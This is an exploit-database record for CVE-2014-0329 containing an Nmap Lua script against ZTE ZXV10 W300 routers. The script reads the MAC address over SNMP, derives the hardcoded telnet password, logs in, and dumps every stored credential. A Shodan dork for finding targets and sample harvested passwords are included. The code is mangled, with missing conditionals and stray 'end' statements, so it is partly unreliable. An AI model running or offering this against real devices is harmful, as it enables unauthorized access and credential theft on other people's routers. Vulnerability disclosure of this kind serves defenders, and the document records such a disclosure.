{
    "text": "ecve : CVE-2014-0329 ， title : ZTE ZXV10 W300 Router - Hard-Coded Credentials - Hardware webapps Exploit ， verified : Not Verified ， exploit_detail :  # Exploit Title : ZTE ZXV10 W300 router contains hardcoded credentials ，  # Date : 03 Feb 2014 ，  # Exploit Author : Cesar Neira ，  # Vendor Homepage :  ，  # Version : ZTE ZXV10 W300 v2.1 ，  # CVE : CVE-2014-0329 ，  # Dork ( Shodan )  : Basic realm=\"index.htm\" ， local nmap = require \"nmap\" ， local stdnse = require \"stdnse\" ， local snmp = require \"snmp\" ， local vulns = require \"vulns\" ， description = [  [  ， ZTE ZXV10 W300 router contains hardcoded credentials that are useable for the ， telnet service on the device. The username is \"admin\" and the password is ， \"XXXXairocon\" where \"XXXX\" is the last four characters of the device's MAC ， address. The MAC address is obtainable over SNMP with community string public. ， author = \"Cesar Neira\" ， license = \"Same as Nmap-See ， categories = {\"vuln\" , \"exploit\" , \"intrusive\"} ， -- @ usage nmap -sU -sS -p U : 161 , T : 23 -script=airocon example.org ， -- @ output ， -- PORT STATE SERVICE ， -- 23/tcp open telnet ， -- 161/udp open | filtered snmp ， -- Host script results :  ， -- | airocon :  ， -- | VULNERABLE :  ， -- | ZTE ZXV10 W300 router contains hardcoded credentials ， -- | State : VULNERABLE ( Exploitable )  ， -- | IDs : CVE : CVE-2014-0329 ， -- | Risk factor : High CVSSv2 : 9.3 ( HIGH )  ( AV : N/AC : M/Au : N/C : C/I : C/A : C )  ， -- | Description :  ， -- | ZTE ZXV10 W300 router contains hardcoded credentials that are useable for the telnet ， -- | service on the device. The username is \"admin\" and the password is \"XXXXairocon\" ， -- | where \"XXXX\" is the last four characters of the device's MAC address. The MAC address ， -- | is obtainable over SNMP with community string public. ， -- | Disclosure date : 2014-2-3 ， -- | Exploit results :  ， -- | admin : 1234 ， -- | support : 1234 ， -- | admin : 0E91airocon ， -- |  ， -- |  ， -- |  ， -- | _ ， -- @ args community SNMP community ( Default : public )  ， local DEFAULT_COMMUNITY = \"public\" ， hostrule = function ( host )  ， local snmp_port , telnet_port ， snmp_port = nmap.get_port_state ( host , {number=161 , protocol=\"udp\"} )  ， end ， telnet_port = nmap.get_port_state ( host , {number=23 , protocol=\"tcp\"} )  ， end ， end ， local get_mac = function ( host , community )  ， local socket , status , response ， socket = nmap.new_socket ( \"udp\" )  ， socket : set_timeout ( 5000 )  ， status , response = socket : connect ( host , 161 )  ， socket : close (  )  ， end ， local payload , request ， request = snmp.buildGetRequest ( {} , \".1.3.6.1.2.1.2.2.1.6.10000\" )  ， payload = snmp.encode ( snmp.buildPacket ( request , 0 , community )  )  ， status , response = socket : send ( payload )  ， socket : close (  )  ， end ， status , response = socket : receive_bytes ( 1 )  ， socket : close (  )  ， end ， socket : close (  )  ， local result ， result = snmp.fetchFirst ( response )  ， end ， end ， local dump_creds = function ( host , user , password )  ， local socket , status , response ， socket = nmap.new_socket ( \"tcp\" )  ， socket : set_timeout ( 5000 )  ， status , response = socket : connect ( host , 23 )  ， socket : close (  )  ， end ， local payload ， payload = user .. \"\\r\" .. password .. \"\\rsh\\rlogin show\\rexit\\r\" ， status , response = socket : send ( payload )  ， socket : close (  )  ， end ， status , response = socket : receive_buf ( \"exit\" , false )  ， socket : close (  )  ， end ， socket : close (  )  ， end ， local parse_response = function ( response )  ， local index ， index = string.find ( response , \"Username +Password +Priority\" )  ， end ， index = string.find ( response , \"\\r\\n\" , index ) + 2 ， response = string.sub ( response , index )  ， local result , endl , line ， result = {} ， index = 0 ， endl = string.find ( response , \"\\r\\n\" , index )  ， line = string.sub ( response , index , endl )  ， line = string.gsub ( line , \"\\r\" , \"\" )  ， line = string.gsub ( line , \"^ +\" , \"\" )  ， line = string.gsub ( line , \" + $ \" , \"\" )  ， line = string.gsub ( line , \" +\" , \" \" )  ， local user , pass , prio ， local aux = {} ， aux [ 'username' ] = user ， aux [ 'password' ] = pass ， aux [ 'priority' ] = prio ， table.insert ( result , aux )  ， end ， index = endl + 2 ， endl = string.find ( response , \"\\r\\n\" , index )  ， end ， end ， action = function ( host )  ， local vuln = { ， title = \"ZTE ZXV10 W300 router contains hardcoded credentials\" ,  ， state = vulns.STATE.NOT_VULN ,  ， IDS = {CVE = 'CVE-2014-0329'} ,  ， risk_factor = \"High\" ,  ， scores = { ， CVSSv2 = \"9.3 ( HIGH )  ( AV : N/AC : M/Au : N/C : C/I : C/A : C ) \" ,  ， } ,  ， description = [  [  ， ZTE ZXV10 W300 router contains hardcoded credentials that are useable for the telnet ， service on the device. The username is \"admin\" and the password is \"XXXXairocon\" ， where \"XXXX\" is the last four characters of the device's MAC address. The MAC address ， is obtainable over SNMP with community string public. ]  ]  ,  ， references = { ， } ,  ， dates = { ， disclosure = {year = 2014 , month = 2 , day = 3} ,  ， } ,  ， exploit_results = {} ,  ， local community ， community = stdnse.get_script_args ( SCRIPT_NAME .. \".community\" ) or DEFAULT_COMMUNITY ， local status , response ， status , response = get_mac ( host , community )  ， end ， local password ， password = string.upper ( string.sub ( response , 9 )  ) .. \"airocon\" ， status , response = dump_creds ( host , \"admin\" , password )  ， end ， status , response = parse_response ( response )  ， end ， vuln.state = vulns.STATE.EXPLOIT ， table.insert ( vuln.exploit_results , data.username .. \" : \" .. data.password )  ， end ， end",
    "time": "2014-02-09"
}